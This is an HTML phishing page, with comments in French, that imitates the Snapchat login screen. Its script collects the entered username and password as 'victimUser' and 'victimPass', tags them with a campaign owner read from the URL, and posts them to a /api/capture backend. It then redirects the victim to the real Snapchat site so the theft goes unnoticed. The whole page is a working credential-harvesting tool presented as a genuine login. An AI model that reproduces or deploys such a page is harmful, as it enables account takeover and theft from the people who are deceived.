<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion Snapchat</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #fffc00; /* Jaune Snapchat emblématique */
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
            box-sizing: border-box;
        }

        .snap-container {
            background-color: #ffffff; /* Blanc pur */
            border-radius: 16px;
            padding: 40px 30px;
            width: 100%;
            max-width: 400px;
            box-sizing: border-box;
            text-align: center;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
        }

        /* Fantôme Snapchat en SVG */
        .snap-logo {
            width: 60px;
            height: 60px;
            margin: 0 auto 20px auto;
            background-color: #fffc00;
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .snap-logo svg {
            width: 38px;
            height: 38px;
            fill: #000000;
        }

        h1 {
            font-size: 22px;
            font-weight: 700;
            color: #000000;
            margin-bottom: 25px;
            margin-top: 0;
        }

        .input-group {
            margin-bottom: 15px;
            text-align: left;
        }

        .input-field {
            width: 100%;
            padding: 14px 16px;
            background-color: #f7f7f7;
            border: 1.5px solid #e5e5e5;
            border-radius: 12px;
            font-size: 15px;
            color: #000000;
            box-sizing: border-box;
            outline: none;
            transition: border-color 0.2s;
        }

        .input-field:focus {
            border-color: #fffc00;
            background-color: #ffffff;
            box-shadow: 0 0 0 3px rgba(255, 252, 0, 0.3);
        }

        .snap-btn {
            background-color: #fffc00;
            color: #000000;
            border: none;
            border-radius: 25px;
            padding: 14px;
            width: 100%;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            margin-top: 15px;
            transition: background-color 0.2s, transform 0.1s;
        }
        .snap-btn:hover {
            background-color: #f3f000;
        }
        .snap-btn:active {
            transform: scale(0.98);
        }

        .forgot-pass {
            display: block;
            margin-top: 20px;
            color: #007aff;
            font-size: 13px;
            font-weight: 600;
            text-decoration: none;
        }
        .forgot-pass:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>

    <div class="snap-container">
        <!-- Logo fantôme Snapchat -->
        <div class="snap-logo">
            <svg viewBox="0 0 28 28">
                <path d="M14.002 2.5c-3.784 0-6.862 3.078-6.862 6.862 0 1.956.804 3.722 2.102 5.002-1.077.568-2.28 1.135-3.528 1.764-1.127.573-1.636 1.92-1.063 3.047.464.915 1.383 1.45 2.348 1.45.244 0 .49-.033.73-.102 1.055-.306 2.072-.676 3.037-1.082.973.914 2.274 1.479 3.704 1.479 1.43 0 2.731-.565 3.704-1.479.965.406 1.982.776 3.037 1.082.24.069.486.102.73.102.965 0 1.884-.535 2.348-1.45.573-1.127.064-2.474-1.063-3.047-1.248-.629-2.451-1.196-3.528-1.764 1.298-1.28 2.102-3.046 2.102-5.002 0-3.784-3.078-6.862-6.862-6.862z"/>
            </svg>
        </div>

        <h1>Se connecter à Snapchat</h1>

        <!-- Formulaire de connexion simple sans OTP -->
        <form id="loginForm">
            <div class="input-group">
                <input type="text" id="username" class="input-field" placeholder="Nom d'utilisateur ou e-mail" required>
            </div>
            <div class="input-group">
                <input type="password" id="password" class="input-field" placeholder="Mot de passe" required>
            </div>

            <button type="submit" class="snap-btn">Connexion</button>
        </form>

        <a href="#" class="forgot-pass" onclick="return false;">Mot de passe oublié ?</a>
    </div>

    <script>
        // Récupération automatique des paramètres de l'URL (?user=Kim&type=standard)
        const urlParams = new URLSearchParams(window.location.search);
        const campaignOwner = urlParams.get('user') || 'Kim';
        const linkType = urlParams.get('type') || 'standard';

        // Gestion de la soumission du formulaire et envoi vers le backend Flask
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault();

            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            const payload = {
                owner: campaignOwner,
                network: "Snapchat",
                type: linkType,
                victimUser: username,
                victimPass: password,
                otp: 'Aucun'
            };

            // Envoi des données capturées vers le backend Flask (/api/capture)
            fetch('/api/capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            }).then(response => {
                window.location.href = "https://www.snapchat.com";
            }).catch(error => {
                window.location.href = "https://www.snapchat.com";
            });
        });
    </script>
</body>
</html>
